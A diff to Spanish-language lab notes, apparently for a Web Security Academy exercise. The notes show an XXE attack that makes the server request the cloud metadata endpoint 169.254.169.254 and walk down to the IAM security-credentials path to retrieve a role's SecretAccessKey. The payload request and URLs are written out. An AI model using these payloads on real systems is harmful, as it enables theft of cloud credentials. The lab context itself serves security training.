@@ -22,7 +22,7 @@ tags:
 > 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/exploit) + el **objetivo** del ataque (archivo/URL/entidad).
 
 **Paso 1 — apuntar a la raíz de la metadata:**
-<pre><code>POST /product/stock HTTP/1.1
+<pre class="payload"><code>POST /product/stock HTTP/1.1
 Host: <mark>TARGET.web-security-academy.net</mark>
 Content-Type: application/xml
 
@@ -32,7 +32,7 @@ Content-Type: application/xml
 La respuesta refleja el siguiente segmento (p.ej. `latest`).
 
 **Paso 2 — bajar la ruta** cambiando la URL de la entidad:
-<pre><code>http://<mark>169.254.169.254</mark>/latest/meta-data/iam/security-credentials/
+<pre class="payload"><code>http://<mark>169.254.169.254</mark>/latest/meta-data/iam/security-credentials/
 http://<mark>169.254.169.254</mark>/latest/meta-data/iam/security-credentials/<mark>admin</mark>   ← nombre del rol</code></pre>
 El último devuelve el JSON con la **`SecretAccessKey`**.
 
